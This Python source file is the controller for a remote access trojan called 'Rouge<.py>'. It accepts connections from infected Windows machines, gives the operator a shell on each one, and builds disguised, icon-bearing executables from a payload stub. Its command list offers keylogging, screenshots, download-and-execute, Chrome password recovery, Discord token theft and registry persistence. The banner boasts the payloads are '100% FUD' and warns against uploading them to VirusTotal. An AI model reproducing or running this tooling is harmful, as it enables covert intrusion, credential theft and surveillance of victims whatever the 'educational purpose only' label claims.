import socket
import  requests
import json
import os
import threading

f = open('serverport.txt', 'r').read()
if f == "{}" or "":
    serverport = input('[+]Enter serverport: ')
    with open('serverport.txt', 'w') as port:
        port.write('4444')


def replace_string(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


def build():
    try:
        import socket
        import json
        import subprocess
        import os
        import pyautogui
        import threading
        import shutil
        import sys
        from os.path import isfile
        import random
        import string
        from requests import get
        from webbrowser import open as op
        import getpass
        import ctypes
        from pynput.keyboard import Listener
        import time
        import win32crypt
        import sqlite3
        import base64
        from PIL import ImageGrab
        from urllib.request import Request, urlopen

        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)
    except Exception as moderror:
        print(moderror)
        print('run installed.bat and restart the tool')
        exit()
    else:
        print("""
1) Manually Enter lhost,lport.
2) Grab lhost,port from pastebin [ex:127.0.0.1:4444]
        """)
        c = int(input('Choose: '))
        if c == 1:
            lhost = input('[-]Enter lhost: ')
            lport = input('[-]Enter lport: ')
            icon = ""
            while isfile(icon) == False:
                icon = input('[-]Enter icon path: ')
            os.system('powershell -c cd stub; cp payload.py ..')
            replace_string('payload.py', '$lhost', lhost)
            replace_string('payload.py', '$lport', lport)
            
            print('\n[+]Compiling')
            os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "payload.py"')
            os.remove('payload.py')
            os.system('powershell -c cd dist; cp payload.exe ..')
        elif c == 2:
            URL = input('Enter yout url: ')
            u = requests.get(URL).text
            sp = u.split(':')
            print('host is:'+sp[0]+'\n port is:'+sp[1])
            os.system('powershell -c cd stub; cp payload-pastebin.py ..')
            ask = input('Is it correct(Y/n)? ')
            if ask == 'Y':
                replace_string('payload-pastebin.py','$pastebin',URL)
                icon = ''
                while isfile(icon) == False:
                    icon = input('[+]Enter icon path: ')
                print('[+]Compiling')
                os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "payload-pastebin.py"')

                os.system('powershell -c cd dist; cp payload-pastebin.exe ..')
            else:
                os.remove('payload-pastebin.py')
                build()
        else:
            build()


def info():
    print("""
+===============================================+                                                                          
|..................Rouge<.py>...................|                                                                          
+-----------------------------------------------+                                                                          
|#Created By =>>       R00tDev1l                |                                                                          
|#Contact: facebook.com/Agent.CCCP.11267KGB     |                                                                          
|#Date Created :      30 January 2022           |                                                                          
|#Join=>> Gray Hat Hackers Community on Facebook|                                                                          
|#mail=>>indradas4863@gmail.com                 |                                                                          
|#Note=>> Educational purpose only              |                                                                          
+===============================================+
  """)
def banner():
    print("""
                                                            @@(                 
                                  .@@@@@@@@@@@&&&@@*    ,@@@.                   
                              (@@@@(              .@@@@@@                       
                            @&@,         ,%%%*                                  
                          @&@       @@&@@*   .%@&@@                             
                         @@@     *@@%             @@@                           
                        @@@     *@@                #@@                          
   ./(%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#/,   
                     /@@ @&(     @&#        @@%    (@@                          
                    %@@   @@@      @&@@&@&&@&     (&@                           
                   @@@      @@@                 (@@(                            
                  @&@@@@&(*   &@@&@.        %@@@&                               
                                ,#&@@@@@@#. 
-------------------------------------------------------------------------------------

__________                                 ___                    ___    
\______   \ ____  __ __  ____   ____      /  /     ______ ___.__. \  \   
 |       _//  _ \|  |  \/ ___\_/ __ \    /  /      \____ <   |  |  \  \  
 |    |   (  <_> )  |  / /_/  >  ___/   (  (       |  |_> >___  |   )  ) 
 |____|_  /\____/|____/\___  / \___  >   \  \   /\ |   __// ____|  /  /  
        \/            /_____/      \/     \__\  \/ |__|   \/      /__/ (Rouge<.py>) 
                                                   


[+]This tool creates 100% FUD python .exe type payload for hacking windows.
[+]This tool can be used in WINDOWS only.(Python3)
[+]Do not upload payloads in VIRUSTOTAL its already FUD.""")


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        print('┌──Shell~%s ' % str(ip))
        command = input('└─$')
        reliable_send(target, command)
        if command == 'quit':
            break

        elif command == 'back':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count) + '.png', 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd path                             --> Changes Directory On Target System
            upload filename                     --> Upload File To The target Machine
            download filename                   --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Read keylogged logs
            keylog_stop                         -->  Stop keylogger
            open_link                           --> Open a URL
            screenshot                          -->  make a screenshot
            dexec                               --> download and execute file from the internet
            start                               --> execute a programme
            run-pwr                             --> execute powershell command
            msgbox                              --> show msgbox ex:msgbox|yourtitle|yourtext
            chrome_recon                        --> recover Chrome Passwords
            disteal                             --> Get Discord tokens
            priv                                --> Check User Priv 
            say                                 --> make Target Computer talk ex: say something
            clip                                --> change data in clipoard
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    global clients
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print((str(ip) + ' has connected!'))
            clients += 1


        except:
            pass


clients = 0
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p = open('serverport.txt', 'r').read()
sock.bind(('', int(p)))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
banner()
print("""
    info            --> Info about the tool. 
    connect         --> connect to target
    sendall         --> send command to all targets
    hacked          --> see connected targets
    exit            --> exit the Rouge<.py>
    kill            --> kill session
    build           --> build payload
    rmlist          --> remove disconnected target from list
    clear           --> clear the screen
    help            --> show this messeage
    """)


while True:
    import subprocess as sp
    acc = sp.getoutput('whoami')
    print('┌──Rouge<.py>:(' + acc + ')')
    command = input('└─$ ')
    if command == 'hacked':
        counter = 0

        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('cls')
    elif command[:7] == 'connect':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print('[-] Invalid Session :( ')
    elif command == 'help':
        print("""
    info            --> Info about the tool. 
    connect         --> connect to target
    sendall         --> send command to all targets
    hacked          --> see connected targets
    exit            --> exit the Rouge<.py>
    kill            --> kill session
    build           --> build payload
    rmlist          --> remove disconnected target from list
    clear           --> clear the screen
    help            --> show this messeage
            """)
    elif command == 'info':
        info()
    elif command == 'build':
        build()
    elif command[:6] == 'rmlist':
        try:
            targ = targets[int(command[7:])]
            ip = ips[int(command[7:])]
            targets.remove(targ)
            ips.remove(ip)
        except:
            print('This session is not available')

    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command == 'clear':
        os.system('cls')
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)

    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print('Failed')
    else:
        print('[-]Error Command 404!!')
